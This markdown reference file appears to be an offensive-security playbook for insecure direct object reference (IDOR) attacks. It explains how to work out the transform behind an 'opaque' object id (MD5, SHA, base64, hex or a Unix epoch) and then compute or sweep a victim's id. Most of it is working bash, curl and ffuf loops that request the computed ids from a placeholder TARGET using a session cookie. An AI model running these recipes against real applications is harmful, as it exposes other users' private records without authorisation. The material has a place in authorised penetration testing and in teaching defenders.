# Computed & encoded identifier recipes (hash, base64, hex, epoch) — Open WHEN: an object id looks opaque or "random" but is plausibly a hash, an encoding, or an alternate numeric view of a guessable value (email, username, integer), and you want to compute the victim's id rather than wait to leak it

The premise: an "unguessable" id is frequently a known plaintext in
disguise. Confirm the transform on a value you OWN (your email, your id),
then apply it to the victim's value and request the object. None of this
needs brute force — it is a direct computation.

## Step 0 — fingerprint the id by length / charset
| Looks like | Length / charset | Likely transform |
|---|---|---|
| `098f6bcd4621d373cade4e832627b4f6` | 32 hex | MD5 |
| `a94a8fe5ccb19ba61c4c0873d391e987982fbbd3` | 40 hex | SHA1 |
| `9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08` | 64 hex | SHA256 |
| `b2f5ff47` | 8 hex | CRC32 |
| `am9obi5kb2VAbWFpbC5jb20=` | base64 charset, `=` padding | base64(email/string) |
| `0x4642e` / `4642e` | short hex | hex view of an integer |
| `1695574808` | 10 digits ~now | Unix-epoch id (per-second) |

## Confirm a hash on YOUR own value, then hash the victim's
Try each algorithm against the inputs you can guess — your email, your
username, your numeric id, and the raw integer as a string.
```bash
ME='you@mail.com'; MINE_ID='8b1a9953c4611296a827abf8c47804d7'   # the id the app gave you
for v in "$ME" "${ME%@*}" "2"; do
  for alg in md5 sha1 sha256 crc32; do
    h=$(php -r "echo hash('$alg', \$argv[1]);" "$v")
    [ "$h" = "$MINE_ID" ] && echo "MATCH: $alg('$v')"
  done
done
# once the (alg,input-shape) is known, compute the victim's id directly:
php -r "echo hash('md5', 'victim@mail.com'), PHP_EOL;"
```
If nothing matches, test salted forms — `md5(salt.value)`,
`md5(value.salt)` — using any constant string that appears in JS bundles,
cookies, or a `__NEXT_DATA__` blob. HMAC variants:
`php -r "echo hash_hmac('sha256','victim@mail.com','LEAKED_KEY');"`.

## Sweep computed hashes of a numeric range (id = md5 of an int)
```bash
for i in $(seq 1 500); do
  gid=$(php -r "echo md5(\$argv[1]);" "$i")
  code=$(curl -s -o /dev/null -w '%{http_code}' -b "session=$C" "https://TARGET/doc/$gid")
  [ "$code" = 200 ] && echo "hit int=$i id=$gid"
done
```

## Decode → mutate → re-encode (the id is only an encoding)
A base64/hex id carries its plaintext. Decode it, change the inner value,
re-encode, request.
```bash
# base64(email) → swap the email
echo 'am9obi5kb2VAbWFpbC5jb20=' | base64 -d            # -> john.doe@mail.com
printf 'victim@mail.com' | base64                       # -> dmljdGltQG1haWwuY29t
curl -s -b "session=$C" "https://TARGET/profile?u=dmljdGltQG1haWwuY29t"

# base64url (no padding, - and _ instead of + /):
printf 'User:457' | basenc --base64url | tr -d '='

# hex(integer) view — walk the integer, re-hex each step
for i in $(seq 287788 287795); do
  h=$(printf '%x' "$i")                                  # decimal -> bare hex
  curl -s -b "session=$C" "https://TARGET/order?id=0x$h" -o "order_$i"
done
```

## Epoch-timestamp ids (id increments ~1 per second)
If ids are creation-time Unix epochs, neighbouring records sit a few
seconds apart. Narrow the window from an email/notification timestamp,
then sweep that band only.
```bash
base=1695574808                                          # known good id ≈ creation time
for off in $(seq -120 120); do
  id=$((base + off))
  curl -s -o /dev/null -w "%{http_code} $id\n" -b "session=$C" "https://TARGET/r/$id"
done | grep '^200'
```

## ffuf over a computed wordlist
Generate the encoded/hashed candidates once, then let `ffuf` filter the
not-found template (keep the cookie attached, `-fr` drops the 404 body).
```bash
for i in $(seq 1 5000); do php -r "echo md5(\$argv[1]),\"\n\";" "$i"; done > ids.txt
ffuf -u 'https://TARGET/doc/FUZZ' -w ids.txt -b "session=$C" -fr 'Not found'
```

## UUIDv1 is time-ordered, not random
A v1 UUID embeds a 60-bit timestamp + node (often a MAC). Two v1 ids
minted seconds apart differ only in the low time bits, so a victim id
created at a known time (from an email/notification) is reachable by
walking the time field. v4 UUIDs are random — do NOT brute them; harvest
them from list/search/export endpoints instead (see
`references/enumeration-recipes.md`).
